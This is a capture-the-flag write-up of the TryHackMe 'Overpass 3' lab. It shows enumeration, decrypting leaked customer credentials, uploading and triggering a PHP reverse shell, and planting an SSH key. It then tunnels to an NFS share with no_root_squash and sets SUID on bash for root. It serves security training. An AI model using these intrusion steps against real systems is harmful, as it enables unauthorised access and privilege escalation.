---
title: "Overpass 3 - TryHackMe"
date: "2021-01-24"
categories: 
  - "tryhackme"
---

This is write-up for tryhackme room name [overpass3](https://tryhackme.com/room/overpass3hosting)

Difficulty Level - Medium

Start with Nmap scan as usual.

```
nmap -A -oN initial $IP
```

![](/Images/overpass3/Screenshot-2021-01-24-181849.png)

FTP won't allow anonymous login so we need to enumerate further. Run gobuster

![](/Images/overpass3/Screenshot-2021-01-24-182318.png)

In **backups** directory we can find ZIP file, when unzip the file we able to find GPG encrypt Excel file and key.

first need to import the gpg key, then we can decrypt

```
$ gpg --import priv.key

$ gpg CustomerDetails.xlsx.gpg
```

open the file we get some customer details with passwords

![](/Images/overpass3/Screenshot-2021-01-24-18-36-01.png)

we have couple of username and password, when we try to those credential for SSH login it fail, but FTP login for **Paradox** user works.

![](/Images/overpass3/Screenshot-2021-01-24-184217.png)

The **backups** directory look similar to what we saw in browser. we can upload shell file and get reverse shell.

To execute the file add this to URL. replace your shell name with "php-reverse-shell.php"

```
http://$IP/backups/../php-reverse-shell.php
```

![](/Images/overpass3/Screenshot-2021-01-24-185313.png)

got shell successfully, we know paradox password worked in FTP so he might used same password for user login try to change user.

User flag in james home so we need to change user to james also upload **linpeas.sh** and more enumeration

we will find these details.

```
#no root squash for NFS
/home/james *(rw,fsid=0,sync,no_root_squash,insecure)

#ssh public key
id_rsa.pub 

#local listen open port
program vers proto   port  service
    100000    4   tcp    111  portmapper
    100000    3   tcp    111  portmapper
    100000    2   tcp    111  portmapper
    100000    4   udp    111  portmapper
    100000    3   udp    111  portmapper
    100000    2   udp    111  portmapper
    100005    1   udp  20048  mountd
    100005    1   tcp  20048  mountd
    100005    2   udp  20048  mountd
    100005    2   tcp  20048  mountd
    100005    3   udp  20048  mountd
    100005    3   tcp  20048  mountd
    100024    1   udp  42167  status
    100024    1   tcp  34731  status
    100003    3   tcp   2049  nfs
    100003    4   tcp   2049  nfs
    100227    3   tcp   2049  nfs_acl
    100021    1   udp  41637  nlockmgr
    100021    3   udp  41637  nlockmgr
    100021    4   udp  41637  nlockmgr
    100021    1   tcp  33285  nlockmgr
    100021    3   tcp  33285  nlockmgr
    100021    4   tcp  33285  nlockmgr
```

first need to create SSH public key and then upload using FTP and insert it to **authorized\_keys**.

![](/Images/overpass3/Screenshot-2021-01-24-192554.png)

now need to port tunnel into our local host so we can mount the NFS share.

```
sudo ssh -L 111:127.0.0.1:111 -L 2049:127.0.0.1:2049 -L 20048:127.0.0.1:20048 -i id_rsa paradox@IP
```

![](/Images/overpass3/Screenshot-2021-01-24-200523.png)

after that mount share with this command.

```
sudo mount -t nfs -o nolock localhost:/home/james /tmp/mount
```

then go to mounted folder path in your PC, you can see all the files, now we can easily escalate privilege.

## Privilege Escalation

James home directory inside SSH folder can find private key for james use that and login as james.

![](/Images/overpass3/Screenshot-2021-01-24-201305.png)

after sucessful login move to local PC and copy-paste "/bin/bash" mounted folder, then we are going to set **SUID** for bash.

![](/Images/overpass3/Screenshot-2021-01-24-202823.png)

we successfully set bash as SUID now execute and get root shell.

![](/Images/overpass3/Screenshot-2021-01-24-202916.png)

Finally Root!!

Happy Hacking!!
